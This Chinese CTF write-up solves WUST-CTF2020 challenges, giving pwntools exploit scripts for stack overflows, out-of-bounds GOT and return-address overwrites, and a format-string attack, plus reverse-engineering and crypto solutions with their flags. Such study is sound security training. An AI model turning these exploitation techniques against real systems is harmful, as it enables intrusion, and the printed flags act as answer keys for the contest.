# 前言

武汉科技大学的萌新赛，刚一开赛就忘了密码的我，发现重置密码要等半小时嗯？新注册小号也要等半小时嗯？于是就只好化身为imagin师傅的小弟啦 (╯#-_-)╯~~

# Pwn

pwn题目基本都是考察基础知识的，十分适合萌新入门，出题人葛格很贴心~

## getshell 

- 题目描述：

  > Author: ColdShield

- 考察点：栈溢出

- 难度：入门

- 初始分值：1000

- 最终分值：632

- 完成人数：33

32位elf，简单的栈溢出，直接覆盖返回地址为后门即可。

``` python
offset = 28
payload = 'A'*offset
payload += p32(0x0804851B)
sl(payload)	
```


## getshell-2

- 题目描述：

  > Author: ColdShield

- 题目附件：[getshell-2](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/getshell-2/getshell-2)

- 考察点：ret2text

- 难度：入门

- 初始分值：1000

- 最终分值：988

- 完成人数：7

### 程序分析

和前面的getshell差不多，只是把`system("/bin/sh")`改了，没法直接getshell

```c
int shell()
{
  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
}
```

### 解题思路

32位的elf，函数参数保存在栈中，所以只要覆盖返回地址为system，再多覆盖4字节用作system的参数就行。字符串结尾给的`sh`可以直接用。

### exp

```python
system = 0x08048529
payload = 'A'*28
payload += p32(system) + p32(0x8048650+32)
sl(payload)
```



## number_game

- 题目描述：

  > Author: ColdShield
  >
  > hint: NEG

- 题目附件：[number_game](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/number_game/number_game)

- 考察点：整数溢出(取反)

- 难度：简单

- 初始分值：1000

- 最终分值：919

- 完成人数：16

### 程序分析

程序关键部分如下：

``` c
__isoc99_scanf("%d", &v1);
if ( v1 < 0 ){
    v1 = -v1;
    if ( v1 < 0 )
        shell();
    else
        printf("You lose");
}
```

读一个整数，如果小于0就取反，如果还小于0就给shell

### 解题思路

这题和[ACTF2020](http://taqini.space/2020/02/13/ACTF2020-writeup/#Pwn)考察abs函数那题原理相同

> `abs(-2147483648)`的返回值仍然是负数

所以直接输入`-2147483648`即可然过两次判断



## closed

- 题目描述：

  > Author: ColdShield

- 题目附件：[closed](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/closed/closed)

- 考察点：重定向

- 难度：入门

- 初始分值：1000

- 最终分值：971

- 完成人数：10

### 程序分析

```nasm
mov     edi, 1          ; fd
call    _close
mov     edi, 2          ; fd
call    _close
mov     eax, 0
call    shell
```

### 解题思路

考察基础知识，直接`exec 1>&0`把`stdout`重定向到`stdin`就行了。



## NameYourDog

- 题目描述：

  > Author: ColdShield

- 题目附件：[NameYourDog](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourDog/NameYourDog)

- 考察点：数组越界

- 难度：简单

- 初始分值：1000

- 最终分值：995

- 完成人数：5

### 程序分析

程序流程如下：

```
   __  ___    ______   ___    
  /  |/  /__ /_  __/__<  /_ __
 / /|_/ / _ `// / / __/ /\ \ /
/_/  /_/\_,_//_/ /_/ /_//_\_\ 

I bought you five male dogs.Name for them?
Name for which?
>1
Give your name plz: Imagin
You get 1 dogs!!!!!!
Whatever , the author prefers cats ^.^
His name is:Imagin

```

就是可以给狗狗起名字，好像一共可以给五只狗狗起名字。

漏洞在起名字函数这里，程序没有检查`Dogs`数组的`index`是否合法：

```c
int vulnerable(){
// ...
	v1 = NameWhich((int)&Dogs);
// ...
}
int __cdecl NameWhich(int a1){
  int index; // [esp+18h] [ebp-10h]
  unsigned int v3; // [esp+1Ch] [ebp-Ch]
  v3 = __readgsdword(0x14u);
  printf("Name for which?\n>");
  __isoc99_scanf("%d", &index);
  printf("Give your name plz: ");
  __isoc99_scanf("%7s", 8 * index + a1);
  return index;
}
```

因此可以造成数组的越界写。

### 解题思路

`Dogs`位于bss段，距离程序GOT表很近，因此可以考虑改函数的GOT表为后门地址。 

```nasm
pwndbg> p &Dogs 
$1 = (<data variable, no debug info> *) 0x804a060 <Dogs>

pwndbg> got
GOT protection: Partial RELRO | GOT functions: 8
[0x804a00c] printf@GLIBC_2.0 -> 0x8048446 (printf@plt+6) ◂— push   0 /* 'h' */
[0x804a010] alarm@GLIBC_2.0 -> 0xf7e92480 (alarm) ◂— mov    edx, ebx
[0x804a014] __stack_chk_fail@GLIBC_2.4 -> 0x8048466 (__stack_chk_fail@plt+6) ◂— push   0x10
[0x804a018] puts@GLIBC_2.0 -> 0xf7e3a210 (puts) ◂— push   ebp
[0x804a01c] system@GLIBC_2.0 -> 0x8048486 (system@plt+6) ◂— push   0x20 /* 'h ' */
[0x804a020] __libc_start_main@GLIBC_2.0 -> 0xf7deb660 (__libc_start_main) ◂— call   0xf7f0a689
[0x804a024] setvbuf@GLIBC_2.0 -> 0xf7e3a860 (setvbuf) ◂— push   ebp
[0x804a028] __isoc99_scanf@GLIBC_2.7 -> 0x80484b6 (__isoc99_scanf@plt+6) ◂— push   0x38 /* 'h8' */
```

`scanf`函数会在给下一只狗狗起名字的时候调用，所以选择改写`scanf`的got表即可

偏移量：`(0x804a028-0x804a060)/8=-7`

### exp

```python
shell = p32(0x080485CB)
sla('>','-7')
sla('Give your name plz: ',shell)
```



## NameYourCat

- 题目描述：

  > Author: ColdShield

- 题目附件：[NameYourCat](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/NameYourCat/NameYourCat)

- 考察点：数组越界

- 难度：简单

- 初始分值：1000

- 最终分值：997

- 完成人数：4

### 程序分析

和狗狗那题类似，出题人不是说喜欢喵嘛~ 这题只是把狗狗改成了喵，还是数组越界的漏洞。

### 解题思路

```c
unsigned int vulnerable(){
  int index; // ST20_4
  signed int i; // [esp+Ch] [ebp-3Ch]
  char Cats[40]; // [esp+14h] [ebp-34h]
  // ...
}
```

这次数组喵`Cats`是`vulnerable`中定义的临时变量

既然喵位于栈中，那么利用数组越界直接修改程序返回地址即可

```nasm
 ► 0x8048695 <NameWhich+99>     call   __isoc99_scanf@plt <0x80484b0>
        format: 0x804889f ◂— 0x733725 /* '%7s' */
        vararg: 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx
```

查看返回地址：

```nasm
0e:0038│ ebp  0xffffcc28 —▸ 0xffffcc88 —▸ 0xffffcc98 ◂— 0x0
0f:003c│      0xffffcc2c —▸ 0x80486e9 (vulnerable+54) ◂— add    esp, 0x10
10:0040│      0xffffcc30 —▸ 0xffffcc54 —▸ 0xf7fe9790 ◂— pop    edx
```

偏移量：`(0xffffcc2c-0xffffcc54)/8=-5`

### exp

```python
shell = p32(0x080485CB)
sla('>','-5')
sla('Give your name plz: ',shell)
```



## easyfast

- 题目描述：

  > Author: ColdShield

- 题目附件：[easyfast](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/easyfast/easyfast)

- 考察点：数组越界

- 难度：中等

- 初始分值：1000

- 最终分值：1000

- 完成人数：2

### 程序分析

貌似是个fastbin attack入门题，标准的菜单式堆题。

然鹅编辑功能没有检查`index`是否合法，因此还是可以数组越界写。

```c
unsigned __int64 edit(){
  __int64 inedx; // ST08_8
  char s; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index>");
  fgets(&s, 8, stdin);
  inedx = atoi(&s);
  read(0, buf[inedx], 8uLL);
  return __readfsqword(0x28u) ^ v3;
}
```

> `buf`位于bss段

### 解题思路

依然可以用修改got表的思路，比如改程序中常用的`atoi`函数：

```nasm
[0x602060] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e443d0 (setvbuf) ◂— push   r13
[0x602068] atoi@GLIBC_2.2.5 -> 0x7ffff7e052c0 (atoi) ◂— sub    rsp, 8
[0x602070] exit@GLIBC_2.2.5 -> 0x400786 (exit@plt+6) ◂— push   0xb /* 'h\x0b' */
```

`read(0, buf[inedx], 8)`是向`buf[index]`中的**指针指向的地址**处写8个字节，因此要构造：

`buf[inedx]=addr` & `addr->0x602068`

因此需要找一个指针，指向`atoi`的got表，显然那就是**reloc表**了

```nasm
pwndbg> search -8 0x602068
easyfast        0x400668 push   0x6020 /* 'h `' */
```

找到以后计算偏移量即可：`(0x400668-0x6020c0)/8=-262987`

> 直接用程序中的后门会因为执行system时栈基址偏移量不对导致getshell失败

所以覆盖`atoi`的got表为`system@plt`，然后给`atoi`传一个`"/bin/sh\0"`的参数即可getshell

### exp

```python
shell = elf.sym['system']
sla('choice>\n','3')
sea('index>\n','-262987')
se(p64(shell))
sl('/bin/sh\0')
```



## babyfmt

- 题目描述：

  > Author: ru7n

- 题目附件：[babyfmt](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/WUST-CTF2020/pwn/babyfmt/babyfmt)

- 考察点：格式化字符串

- 难度：困难

- 初始分值：1000

- 最终分值：1000

- 完成人数：2

本次比赛中最好玩儿的一道pwn题~

### 程序分析

先看下程序的流程吧

```shell
% ./babyfmt 
dididada.....
tell me the time:12 13 14
ok! time is 12:13:14
1. leak
2. fmt_attack
3. get_flag
4. exit
>>
```

先是有个didadida要求输入时间，不知道有什么用，下一个。

然后就是菜单了：

* 选2可以完成一下格式化字符串攻击
* 选1可以泄漏任意地址的**一个字节**...哼太抠门了！
* 选3会要求你输入一个字符串然后与`secret`进行比对，如果对了就打印flag。。。。嘛？

显然没那么简单

```c
  if ( !strncmp(secret, &s2, 0x40uLL) ){
    close(1);
    fd = open("/flag", 0);
    read(fd, &s2, 0x50uLL);
    printf(&s2, &s2);
    exit(0);
  }
```

出题人把`stdout`关掉了，所以`printf`啥都打印不出来。

> `secret`是程序开始时读的一个0x40长的随机数据

除此以外还有一处限制，`leak`和`fmt_attack`只能利用一次：

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp){
  // ...
  fmt_flag = 0;
  leak_flag = 0;
  //...
      if ( v3 != 2 )
          break;
        fmt_attack(&fmt_flag);
      }
      if ( v3 > 2 )
        break;
      if ( v3 == 1 )
        leak(&leak_flag);
   //...
}

unsigned __int64 __fastcall fmt_attack(_DWORD *a1){
  char format; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(&format, 0, 0x30uLL);
  if ( *a1 > 0 )
  {
    puts("No way!");
    exit(1);
  }
  *a1 = 1;
  read_n(&format, 40);
  printf(&format, 40LL);
  return __readfsqword(0x28u) ^ v3;
}
```

用完会把相应的变量置1。

此外，这道题保护全开：

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

太有意思啦~

### 解题思路

保护全开所以没法改GOT表，还需要泄漏地址绕过地址随机化保护。

leak那个函数跟开玩笑似的（哼，就不用它）。

所以攻击思路就是利用好**格式化字符串漏洞**：

1. 先泄漏程序基址和栈地址
2. 然后再修改程序返回地址，跳过`close(1)`，直接打印flag

```nasm
0x00000f48      85c0           test eax, eax
0x00000f4a      7554           jne 0xfa0
0x00000f4c      bf01000000     mov edi, 1
0x00000f51      e832faffff     call sym.imp.close

0x00000f56      be00000000     mov esi, 0
0x00000f5b      488d3d170200.  lea rdi, str.flag           ; 0x1179 ; "/flag"
0x00000f62      b800000000     mov eax, 0
0x00000f67      e844faffff     call sym.imp.open
0x00000f6c      89459c         mov dword [rbp - 0x64], eax
0x00000f6f      488d4da0       lea rcx, [rbp - 0x60]
```

> 直接跳到0x00000f56这里，绕过close(1)

问题在于格式化字符串漏洞只能用一次，而完成上述攻击至少需要利用**两次**。

这也不难，因为限制次数的变量也在**栈中**，所以只要在泄漏地址的同时，把限制次数的变量清零即可。

payload1:

```python
sl('%7$hhn%17$p.%16$p')
```

> 清空变量、泄漏程序基址、泄漏栈地址。

payload2:

```python
payload = '%%%dc'%(flag&0xffff)+'%10$hn'
payload = payload.ljust(16,'A')
payload+= p64(stack)
sl(payload)
```

> 覆盖返回地址为打印flag部分代码地址

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './baby'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file,env={'LD_PRELOAD':remote_libc})
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
sla('tell me the time:','1 1 1')
sla('>>','2')
sl('%7$hhn%17$p.%16$p')
base = eval(ru('.'))-4140
stack = eval(ru('\n'))-40
info_addr('stack',stack)
flag = base+0xF56
info_addr('flag',flag&0xffff)
sla('>>','2')
# debug()
payload = '%%%dc'%(flag&0xffff)+'%10$hn'
payload = payload.ljust(16,'A')
payload+= p64(stack)
sl(payload)

p.interactive()
```



# Re

## Cr0ssfun

和[Sarctf - Crossw0rd](http://taqini.space/2020/02/16/sarctf-writeup/#Reverse) 一样的套路

> flag: wctf2020{cpp_@nd_r3verse_@re_fun}



## level1

加密：

```c
  stream = fopen("flag", "r");
  fread(ptr, 1uLL, 0x14uLL, stream);
  fclose(stream);
  for ( i = 1; i <= 19; ++i )
  {
    if ( i & 1 )
      printf("%ld\n", (unsigned int)(ptr[i] << i));
    else
      printf("%ld\n", (unsigned int)(i * ptr[i]));
  }
```

解密：

```python
#!/usr/bin/python
#__author__:TaQini

c = [198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000]

for i in range(1,20):
    #print i,
    if i&1:
        ch = c[i-1]>>i
    else:
        ch = c[i-1]/i
    print chr(ch),

# wctf2020{d9-dE6-20c}
```



## level2

解法同flag

```shell
$ upx -d level2
$ rabin2 -zz lv2/level2 | grep ctf 
6579 0x000a1068 0x080ea068 21  22   .data   ascii   wctf2020{Just_upx_-d}
```



## level3

base64换表。直接照抄下来编译运行输出新表

```c
#include <stdio.h>
int main(){
  char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  int i;
  char v0,result;
  for ( i = 0; i <= 9; ++i )
  {
    v0 = base64_table[i];
    base64_table[i] = base64_table[19 - i];
    result = 19 - i;
    base64_table[result] = v0;
  }
  puts(base64_table);
  return result;
}
```

然后用新表解base64即可

```python
#!/usr/bin/python
#__author__:TaQini

table = 'TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
c = 'd2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD'

def d(table):                 
    l = [table.index(i) for i in c]
    s = [bin(i)[2:].rjust(6,'0') for i in l]
    print (hex(int(''.join(s),2))[2:-1]+'0').decode('hex')

d(table)
```



## level4

运行程序，输出如下：

```
Practice my Data Structure code.....
Typing....Struct.....char....*left....*right............emmmmm...OK!
Traversal!
Traversal type 1:2f0t02T{hcsiI_SwA__r7Ee}
Traversal type 2:20f0Th{2tsIS_icArE}e7__w
Traversal type 3:    //type3(&x[22]);   No way!
```

....

二叉树啊...常见的烤盐数据结构题目，已知中序后序求先序...就是节点有点多...懒得写jio本，直接手解

![](http://image.taqini.space/img/EC2F7D6D508D15D0F715897F481CDE0B.jpg)

被迫复习二叉树，感谢出题人。

> flag: wctf2020{This_IS_A_7reE}



## funnyre

复制过来，逆序输出...

```c
#include <stdio.h>

char de(char a){
    char tmp = a;
    tmp = tmp - '\b';
    tmp = tmp - '\x15';
    tmp = tmp - '<';
    tmp = tmp - '\x18';
    tmp = tmp - '\a';
    tmp = tmp - '\x10';
    tmp = tmp - '\x14';
    tmp = tmp - '\x1f';
    tmp = tmp - '\x1c';
    tmp = tmp - '6';
    tmp = tmp - '\x1a';
    tmp = tmp - 'N';
    tmp = tmp - '\"';
    tmp = tmp - '-';
    tmp = tmp - '\r';
    tmp = tmp - 'Q';
    tmp = tmp - 'b';
    tmp = tmp - '\x16';
    tmp = tmp - 'L';
    tmp = tmp - ']';
    tmp = tmp - '$';
    tmp = tmp - '0';
    tmp = tmp - 'H';
    tmp = tmp - '\x03';
    tmp = tmp - '_';
    tmp = tmp - '\\';
    tmp = tmp - '\x12';
    tmp = tmp - '3';
    tmp = tmp - '\x19';
    tmp = tmp - '#';
    tmp = tmp - '\'';
    tmp = tmp - '?';
    tmp = tmp - 'X';
    tmp = tmp - '\x13';
    tmp = tmp - '.';
    tmp = tmp - 'R';
    tmp = tmp - 'B';
    tmp = tmp - '\x1b';
    tmp = tmp - '/';
    tmp = tmp - '1';
    tmp = tmp - '\x1d';
    tmp = tmp - '>';
    tmp = tmp - '\x17';
    tmp = tmp - '\x02';
    tmp = tmp - 'M';
    tmp = tmp - '\x0f';
    tmp = tmp - '%';
    tmp = tmp - '(';
    tmp = tmp - '\x04';
    tmp = tmp - 'K';
    tmp = tmp - '\x0e';
    tmp = tmp - 'E';
    tmp = tmp - '=';
    tmp = tmp - '*';
    tmp = tmp - '4';
    tmp = tmp - 'I';
    tmp = tmp - '\x06';
    tmp = tmp - '8';
    tmp = tmp - '`';
    tmp = tmp - 'G';
    tmp = tmp - 'C';
    tmp = tmp - '2';
    tmp = tmp - 'D';
    tmp = tmp - 'a';
    tmp = tmp - ' ';
    tmp = tmp - '7';
    tmp = tmp - 'V';
    tmp = tmp - '^';
    tmp = tmp - '\v';
    tmp = tmp - '!';
    tmp = tmp - '+';
    tmp = tmp - '&';
    tmp = tmp - '\x11';
    tmp = tmp - 'J';
    tmp = tmp - '\n';
    tmp = tmp - 'T';
    tmp = tmp - '\f';
    tmp = tmp - 'F';
    tmp = tmp - ',';
    tmp = tmp - 'Y';
    tmp = tmp - 'U';
    tmp = tmp - ')';
    tmp = tmp - '5';
    tmp = tmp - 'A';
    tmp = tmp - '9';
    tmp = tmp - 'Z';
    tmp = tmp - '\x01';
    tmp = tmp - ':';
    tmp = tmp - ';';
    tmp = tmp - 'S';
    tmp = tmp - 'W';
    tmp = tmp - 'c';
    tmp = tmp - '\x05';
    tmp = tmp - '\t';
    tmp = tmp - '[';
    tmp = tmp - '\x1e';
    tmp = tmp - 'O';
    tmp = tmp - '@';
    tmp = tmp - 'P';
    tmp = tmp ^ 0x67;
    tmp = tmp ^ 0x68;
    tmp = tmp ^ 0xc3;
    tmp = tmp ^ 0x23;
    tmp = tmp ^ 0xe9;
    tmp = tmp ^ 8;
    tmp = tmp ^ 0x3b;
    tmp = tmp ^ 0x50;
    tmp = tmp ^ 0xfa;
    tmp = tmp ^ 100;
    tmp = tmp ^ 200;
    tmp = tmp ^ 5;
    tmp = tmp ^ 0xf5;
    tmp = tmp ^ 0x76;
    tmp = tmp ^ 0x86;
    tmp = tmp ^ 0x41;
    tmp = tmp ^ 0x99;
    tmp = tmp ^ 0xf0;
    tmp = tmp ^ 0x37;
    tmp = tmp ^ 0x49;
    tmp = tmp ^ 0x4c;
    tmp = tmp ^ 0x18;
    tmp = tmp ^ 0x39;
    tmp = tmp ^ 0x5d;
    tmp = tmp ^ 0x2c;
    tmp = tmp ^ 0x75;
    tmp = tmp ^ 0x4d;
    tmp = tmp ^ 0x95;
    tmp = tmp ^ 0xed;
    tmp = tmp ^ 0x84;
    tmp = tmp ^ 0x10;
    tmp = tmp ^ 0x32;
    tmp = tmp ^ 2;
    tmp = tmp ^ 0x12;
    tmp = tmp ^ 0x9c;
    tmp = tmp ^ 0x65;
    tmp = tmp ^ 0x73;
    tmp = tmp ^ 0x2f;
    tmp = tmp ^ 0x13;
    tmp = tmp ^ 0xc;
    tmp = tmp ^ 0xbd;
    tmp = tmp ^ 0x96;
    tmp = tmp ^ 0xa8;
    tmp = tmp ^ 0x33;
    tmp = tmp ^ 0xd2;
    tmp = tmp ^ 0xe2;
    tmp = tmp ^ 199;
    tmp = tmp ^ 0xd3;
    tmp = tmp ^ 0x4e;
    tmp = tmp ^ 0xa9;
    tmp = tmp ^ 0xf9;
    tmp = ~tmp;
    tmp = tmp ^ 0xef;
    tmp = tmp ^ 0x62;
    tmp = tmp ^ 0x66;
    tmp = tmp ^ 0xce;
    tmp = tmp ^ 0x14;
    tmp = tmp ^ 0xb;
    tmp = tmp ^ 0xb6;
    tmp = tmp ^ 7;
    tmp = tmp ^ 0xa3;
    tmp = tmp ^ 0x97;
    tmp = tmp ^ 0xdc;
    tmp = tmp ^ 0xb8;
    tmp = tmp ^ 0xe7;
    tmp = tmp ^ 0xd5;
    tmp = tmp ^ 0x7f;
    tmp = tmp ^ 0x82;
    tmp = tmp ^ 0x34;
    tmp = tmp ^ 0xe1;
    tmp = tmp ^ 0x98;
    tmp = tmp ^ 0xe3;
    tmp = tmp ^ 0xf6;
    tmp = tmp ^ 0xeb;
    tmp = tmp ^ 0xd8;
    tmp = tmp ^ 0xda;
    tmp = tmp ^ 0x1d;
    tmp = tmp ^ 0x9d;
    tmp = tmp ^ 0x7d;
    tmp = tmp - -0x80;
    tmp = tmp ^ 0xc9;
    tmp = tmp ^ 0x27;
    tmp = tmp ^ 0xa0;
    tmp = tmp ^ 0x8e;
    tmp = tmp ^ 0xf7;
    tmp = tmp ^ 0x6f;
    tmp = tmp ^ 0xfb;
    tmp = tmp ^ 0x9a;
    tmp = tmp ^ 0x9b;
    tmp = tmp ^ 0xcb;
    tmp = tmp ^ 0xd4;
    tmp = tmp ^ 0x30;
    tmp = tmp ^ 0xac;
    tmp = tmp ^ 0x60;
    tmp = tmp ^ 0x92;
    tmp = tmp ^ 0xaf;
    tmp = tmp ^ 0x2d;
    tmp = tmp ^ 0xab;
    tmp = tmp ^ 0x51;
    tmp = tmp ^ 0xb7;
    tmp = tmp ^ 0x35;
    tmp = tmp ^ 0xd0;
    tmp = tmp ^ 0xa4;
    tmp = tmp ^ 0xad;
    tmp = tmp ^ 0xc0;
    tmp = tmp ^ 0xec;
    tmp = tmp ^ 0xbe;
    tmp = tmp ^ 0xfc;
    tmp = tmp ^ 0xbb;
    tmp = tmp ^ 0x54;
    tmp = tmp ^ 0xc5;
    tmp = tmp ^ 0xc1;
    tmp = tmp ^ 0xc6;
    tmp = tmp ^ 3;
    tmp = tmp ^ 0xde;
    tmp = tmp ^ 0x5e;
    tmp = tmp ^ 0x3a;
    tmp = tmp ^ 0xfd;
    tmp = tmp ^ 0x29;
    tmp = tmp ^ 0x31;
    tmp = tmp ^ 0x85;
    tmp = tmp ^ 0x2b;
    tmp = tmp ^ 0xb9;
    tmp = tmp ^ 0x55;
    tmp = tmp ^ 0xdf;
    tmp = tmp ^ 0xcf;
    tmp = tmp ^ 0x4b;
    tmp = tmp ^ 0xcc;
    tmp = tmp ^ 0x1f;
    tmp = tmp ^ 0xd6;
    tmp = tmp ^ 0x93;
    tmp = tmp ^ 0xf;
    tmp = tmp ^ 0xe0;
    tmp = tmp ^ 0xd1;
    tmp = tmp ^ 0xb0;
    tmp = tmp ^ 0xf1;
    tmp = tmp ^ 0x56;
    tmp = tmp ^ 0xf4;
    tmp = tmp ^ 0x45;
    tmp = tmp ^ 99;
    tmp = tmp ^ 0x7c;
    tmp = tmp ^ 0x2e;
    tmp = tmp ^ 0x11;
    tmp = tmp ^ 0x81;
    tmp = tmp ^ 0x1c;
    tmp = tmp ^ 0x77;
    tmp = tmp ^ 0xfe;
    tmp = tmp ^ 0x3f;
    tmp = tmp ^ 0x36;
    tmp = tmp ^ 0x87;
    tmp = tmp ^ 0xbf;
    tmp = tmp ^ 0xba;
    tmp = tmp ^ 0x8b;
    tmp = tmp ^ 0xa7;
    tmp = tmp ^ 0x26;
    tmp = tmp ^ 0x5f;
    tmp = tmp ^ 0x72;
    tmp = tmp ^ 0xdb;
    tmp = tmp ^ 0x47;
    tmp = tmp ^ 0x4a;
    tmp = tmp ^ 0x15;
    tmp = tmp ^ 0x19;
    tmp = tmp ^ 0xb4;
    tmp = tmp ^ 0x7b;
    tmp = tmp ^ 0x8a;
    tmp = tmp ^ 9;
    tmp = tmp ^ 0xe8;
    tmp = tmp ^ 0x71;
    tmp = tmp ^ 0x20;
    tmp = tmp ^ 0x88;
    tmp = tmp ^ 0xe6;
    tmp = tmp ^ 0x46;
    tmp = tmp ^ 0x25;
    tmp = tmp ^ 0xee;
    tmp = tmp ^ 0xa5;
    tmp = tmp ^ 0x8f;
    tmp = tmp ^ 0x43;
    tmp = tmp ^ 0x1a;
    tmp = tmp ^ 0x5b;
    tmp = tmp ^ 0xd9;
    tmp = tmp ^ 0x61;
    tmp = tmp ^ 0x79;
    tmp = tmp ^ 0xa6;
    tmp = tmp ^ 0xb3;
    tmp = tmp ^ 0x8c;
    tmp = tmp ^ 0x90;
    tmp = tmp ^ 0x44;
    tmp = tmp ^ 0x3d;
    tmp = tmp ^ 0xc2;
    tmp = tmp ^ 0x22;
    tmp = tmp ^ 0x6b;
    tmp = tmp ^ 0xa2;
    tmp = tmp ^ 0x1e;
    tmp = tmp ^ 0x6d;
    tmp = tmp ^ 0x57;
    tmp = tmp ^ 0x74;
    tmp = tmp ^ 1;
    tmp = tmp ^ 0xbc;
    tmp = tmp ^ 0x94;
    tmp = tmp ^ 0x2a;
    tmp = tmp ^ 0x7e;
    tmp = tmp ^ 0xe5;
    tmp = tmp ^ 0x21;
    tmp = tmp ^ 0x5c;
    tmp = tmp ^ 0x69;
    tmp = tmp ^ 0xb1;
    tmp = tmp ^ 0x5a;
    tmp = tmp ^ 0x17;
    tmp = tmp ^ 0xd;
    tmp = tmp ^ 0xb5;
    tmp = tmp ^ 0xd7;
    tmp = tmp ^ 0x16;
    tmp = tmp ^ 0x89;
    tmp = tmp ^ 0x40;
    tmp = tmp ^ 0x6e;
    tmp = tmp ^ 0xe4;
    tmp = tmp ^ 0x48;
    tmp = tmp ^ 0xea;
    tmp = tmp ^ 0x28;
    tmp = tmp ^ 0x70;
    tmp = tmp ^ 0x78;
    tmp = tmp ^ 6;
    tmp = tmp ^ 0xa1;
    tmp = tmp ^ 0x3c;
    tmp = tmp ^ 0x9f;
    tmp = tmp ^ 0xf2;
    tmp = tmp ^ 0x58;
    tmp = tmp ^ 0xf8;
    tmp = tmp ^ 0xae;
    tmp = tmp ^ 0xaa;
    tmp = tmp ^ 0x1b;
    tmp = tmp ^ 0x52;
    tmp = tmp ^ 0xdd;
    tmp = tmp ^ 0x7a;
    tmp = tmp ^ 0x38;
    tmp = tmp ^ 0x8d;
    tmp = tmp ^ 0xe;
    tmp = tmp ^ 0x42;
    tmp = tmp ^ 0x9e;
    tmp = tmp ^ 4;
    tmp = tmp ^ 0x53;
    tmp = tmp ^ 0xc4;
    tmp = tmp ^ 0x83;
    tmp = tmp ^ 0x24;
    tmp = tmp ^ 0x4f;
    tmp = tmp ^ 0x6c;
    tmp = tmp ^ 0x3e;
    tmp = tmp ^ 0xca;
    tmp = tmp ^ 0xf3;
    tmp = tmp ^ 10;
    tmp = tmp ^ 0x59;
    tmp = tmp ^ 0x6a;
    tmp = tmp ^ 0xcd;
    tmp = tmp ^ 0x91;

    return tmp;
}

int main(){
    unsigned char code[] = {'\xD9','\x2C','\x27','\xD6','\xD8','\x2A','\xDA','\x2D','\xD7','\x2C','\xDC','\xE1','\xDB','\x2C','\xD9','\xDD','\x27','\x2D','\x2A','\xDC','\xDB','\x2C','\xE1','\x29','\xDA','\xDA','\x2C','\xDA','\x2A','\xD9','\x29','\x2A'};
    int i;
    printf("flag{");
    for (i = 0; i < 0x20; ++i){
        unsigned char c = de(code[i]);
        printf("%c", c);
    }
    printf("}");
}
```



# Crypto

## 大树运算

题目：

```
flag等于 wctf2020{Part1-Part2-Part3-Part4} 每一Part都为数的十六进制形式（不需要0x)，并用 '-' 连接
Part1 = 2020×2019×2018× ... ×3×2×1 的前8位
Part2 = 520^1314 + 2333^666 的前8位
Part3 = 宇宙终极问题的答案 x, y, z绝对值和的前8位
Part4 = 见图片附件，计算结果乘上1314
```

算出来就行（part4那个是一个定积分 x^2 | 22,0 ）



## B@se

base64换表，但是表缺了4个字节，不多，直接爆破就行。

```python
#!/usr/bin/python
#__author__:TaQini

import itertools
a = 'JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs****kxyz012789+/'
b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
c = 'MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD'
l = [''.join(i) for i in itertools.permutations(set(b)-set(a),4)] 
ll = [a.replace('****',i) for i in l]

def d(table):                 
    l = [table.index(i) for i in c]
    s = [bin(i)[2:].rjust(6,'0') for i in l]
    print (hex(int(''.join(s),2))[2:-1]+'0').decode('hex')

for i in ll:
    d(i)
    print i
    print ''
```

> flag: wctf2020{base64_1s_v3ry_e@sy_and_fuN}



## 情书

题目：

```
Premise: Enumerate the alphabet by 0、1、2、.....  、25
Using the RSA system 
Encryption:0156 0821 1616 0041 0140 2130 1616 0793
Public Key:2537 and 13
Private Key:2537 and 937

flag: wctf2020{Decryption}
```

私钥都给了，直接解就行...
